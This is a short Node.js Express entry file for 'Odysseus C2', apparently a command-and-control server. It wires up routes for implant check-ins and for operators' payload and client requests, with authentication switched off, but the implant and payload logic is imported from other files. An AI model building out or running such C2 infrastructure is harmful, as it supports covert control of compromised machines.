
global.express = require("express");
const app = express();

const DatabaseHelper = require("./helpers/DatabaseHelper")
global.databaseHelper = new DatabaseHelper();
global.cryptoHelper = require("./helpers/CryptoHelper");

// JSON data.
const bodyParser = require("body-parser");
app.use(bodyParser.json());

// Allow CORS.
const cors = require("cors");
app.use(cors());

/**
 * These routes handle implant requests.
 */
app.use("/", require("./controllers/implant/ImplantController"));

/**
 * These routes handle user requests.
 */
app.use("/payload", require("./controllers/client/PayloadController"));
app.use("/client", require("./controllers/client/ClientController"));

global.serverOptions = {
    useAuthentication: false
}

app.listen(8080, () => {
    console.log("Odysseus C2 running...");
});